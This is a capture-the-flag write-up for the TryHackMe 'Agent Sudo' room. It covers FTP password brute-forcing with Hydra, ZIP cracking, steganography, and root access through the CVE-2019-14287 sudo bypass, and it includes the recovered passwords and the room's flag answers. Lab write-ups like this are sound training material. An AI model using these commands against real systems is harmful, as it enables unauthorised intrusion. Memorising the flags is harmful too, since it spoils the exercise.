
# TryHackMe: Agent Sudo Write-Up

> A complete penetration testing walkthrough of the Agent Sudo room, covering reconnaissance, credential discovery, steganography,
> OSINT, and privilege escalation through CVE-2019-14287.

---

## Room Information

| Category | Value |
|-----------|---------|
| Platform | TryHackMe |
| Room | Agent Sudo |
| Difficulty | Easy |
| Target IP | `<TARGET_IP>` |
| Objective | Capture User Flag and Root Flag |

---

# Executive Summary

Agent Sudo is a beginner-friendly Capture The Flag (CTF) machine that combines multiple attack techniques commonly encountered d
uring penetration tests:

- Service Enumeration
- HTTP Header Manipulation
- Password Brute Forcing
- FTP Enumeration
- Archive Cracking
- Steganography
- OSINT Investigation
- Linux Privilege Escalation

The compromise path followed these stages:

```text
Web Enumeration
      ↓
User-Agent Manipulation
      ↓
Discover User "chris"
      ↓
FTP Password Brute Force
      ↓
Access FTP Files
      ↓
Hidden ZIP Extraction
      ↓
ZIP Password Cracking
      ↓
Steganography Extraction
      ↓
SSH Access as james
      ↓
OSINT Investigation
      ↓
CVE-2019-14287 Exploitation
      ↓
Root Access
```

---

# Phase 1: Reconnaissance

## Nmap Enumeration

The first step was identifying exposed services running on the target.

### Command

```bash
nmap -sV -sC -A <TARGET_IP>
```

### Output (Relevant)

```text
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

### Findings

| Port | Service |
|--------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

**Total Open Ports:** `3`

---

# Phase 2: Web Enumeration

Navigating to the website revealed a message from Agent R.

### Web Page Content

```html
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

The message strongly suggested that the application relied on the HTTP **User-Agent** header.

---

## Testing User-Agent Values

Using curl, different User-Agent strings were tested.

### Command

```bash
curl -A "C" http://<TARGET_IP>
```

### Output

```html
<!DocType html>
<html>
<head>
<title>Announcement</title>
</head>

<body>
<p>
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
</p>
</body>
</html>
```

The page still displayed the same content.

---

## Following Redirects

Adding the `-L` option allowed curl to follow redirects.

### Command

```bash
curl -A "C" -L http://<TARGET_IP>
```
```bash
-A "C"  : Sets the HTTP User-Agent header to "C".
-L      : Instructs curl to automatically follow HTTP redirects (301, 302, 307, etc.).

When accessing a website, the server may respond with a redirect that points to another
page, such as /secret or /agent/landing. Without the -L option, curl only displays the
redirect response and the Location header, then stops. By using -L, curl follows the
redirect and retrieves the content of the destination page automatically.
```
### Output

```text
Attention chris,

Do you still remember our deal?
Please tell agent J about the stuff ASAP.

Also, change your god damn password, it is weak!

From,
Agent R
```

### Key Discovery

A valid username was disclosed:

```text
chris
```

---

# Phase 3: FTP Credential Discovery

The message indicated that Chris used a weak password.

A brute-force attack was performed against the FTP service.

### Command

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

### Output

```text
ftp <TARGET_IP>
login: chris
password: crystal
```

### Credentials Obtained

```text
Username: chris
Password: crystal
```

---

# Phase 4: FTP Enumeration

Login to the FTP service.

### Command

```bash
ftp <TARGET_IP>
```

### Authentication

```text
Name: chris
Password: crystal
```

List available files.

### Command

```bash
ls
```

### Output

```text
cutie.png
cute-alien.jpg
To_agentJ.txt
```

Download all files.

### Command

```bash
mget *
```

---

# Phase 5: Hidden ZIP Discovery

The PNG image appeared suspicious.

A quick examination with 7-Zip revealed embedded archive data.

### Command

```bash
7z e cutie.png
```

### Output

```text
Path = cutie.png
Type = zip
Offset = 34562
Physical Size = 280

ERROR:
Wrong password : To_agentR.txt
```

### Observation

A password-protected ZIP archive was hidden inside the image.

---

# Phase 6: ZIP Password Cracking

Extract the ZIP hash.

### Command

```bash
zip2john secret.zip > zip.hash
```

Crack it with John the Ripper.

### Command

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### Output

```text
Loaded 1 password hash

alien
(secret.zip/To_agentR.txt)

Session completed
```

### ZIP Password

```text
alien
```

---

## Extract ZIP Contents

### Command

```bash
7z e secret.zip
```

### Read Message

```bash
cat To_agentR.txt
```

### Output

```text
Agent C,

We need to send the picture to
QXJlYTUx
as soon as possible!

By,
Agent R
```

---

# Phase 7: Base64 Decoding

The string looked like Base64 encoded data.

### Command

```bash
echo "QXJlYTUx" | base64 -d
```

### Output

```text
Area51
```

### Discovery

```text
Steganography Password: Area51
```

---

# Phase 8: Steganography Analysis

The second image contained hidden data.

### Command

```bash
steghide extract -sf cute-alien.jpg
```

### Password

```text
Area51
```

### Output

```text
wrote extracted data to "message.txt"
```

Read the extracted message.

### Command

```bash
cat message.txt
```

### Output

```text
Hi James,

Glad you find this message.

Your password is:

hackerrules!
```

### Credentials Obtained

```text
Username: james
Password: hackerrules!
```

---

# Phase 9: SSH Access

Login as James.

### Command

```bash
ssh james@<TARGET_IP>
```

### Password

```text
hackerrules!
```

---

# Phase 10: Capture User Flag

Locate and read the user flag.

### Command

```bash
cat user_flag.txt
```

### Output

```text
b03d975e8c92a7c04146cfa7a5a313c7
```

### User Flag

```text
b03d975e8c92a7c04146cfa7a5a313c7
```

---

# Phase 11: OSINT Investigation

Inside James's home directory was an image related to a historical UFO incident.

After performing a reverse image search and researching references connected to:

```text
Alien
Area 51
Roswell
```

the image was identified as relating to:

```text
Roswell Alien Autopsy
```

### Answer

```text
Roswell Alien Autopsy
```

---

# Phase 12: Privilege Escalation Enumeration

Check sudo permissions.

### Command

```bash
sudo -l
```

### Output

```text
Matching Defaults entries for james:

env_reset,
mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User james may run the following commands:

(ALL, !root) /bin/bash
```

Although root execution was explicitly denied, the configuration looked suspicious.

---

## Check Sudo Version

### Command

```bash
sudo --version
```

### Output

```text
Sudo version 1.8.21p2
```

Researching this version revealed a known vulnerability.

---

# CVE Identification

### Vulnerability

```text
CVE-2019-14287
```

### Description

A flaw in sudo allows users restricted by:

```text
(ALL, !root)
```

to bypass restrictions by specifying user ID:

```text
-1
```



which sudo incorrectly interprets as UID 0 (root).

---

# Phase 13: Exploiting CVE-2019-14287

Execute Bash using UID `-1`.

### Command

```bash
sudo -u#-1 /bin/bash
```

Verify privileges.

### Command

```bash
whoami
```

### Output

```text
root
```

Root access successfully obtained.

---

# Phase 14: Capture Root Flag

Navigate to the root directory.

### Command

```bash
cd /root
cat root.txt
```

### Output

```text
b53a02f55b57d4439e3341834d70c062
```

### Root Flag

```text
b53a02f55b57d4439e3341834d70c062
```

---

# Bonus Question

## Who is Agent R?

### Answer

```text
DesKel
```

---

# Flags Collected

| Flag | Value |
|--------|---------|
| User Flag | `b03d975e8c92a7c04146cfa7a5a313c7` |
| Root Flag | `b53a02f55b57d4439e3341834d70c062` |

---

# Vulnerabilities Identified

| Vulnerability | Impact |
|--------------|---------|
| User-Agent Based Access Control | Information Disclosure |
| Weak FTP Password | Credential Compromise |
| Sensitive Data Stored in Images | Credential Exposure |
| Hidden Password-Protected Archive | Information Leakage |
| Steganography Abuse | Secret Data Disclosure |
| CVE-2019-14287 | Privilege Escalation to Root |

---


# Conclusion

Agent Sudo demonstrates how seemingly small weaknesses can be chained together into full system compromise.
The attack began with simple web enumeration and User-Agent manipulation, progressed through FTP credential 
attacks, steganographic extraction, and OSINT investigation, and ultimately culminated in a complete root
compromise via CVE-2019-14287.

This room is an excellent introduction to multi-stage exploitation and highlights the importance of thorough 
enumeration, credential security, and proper privilege management.

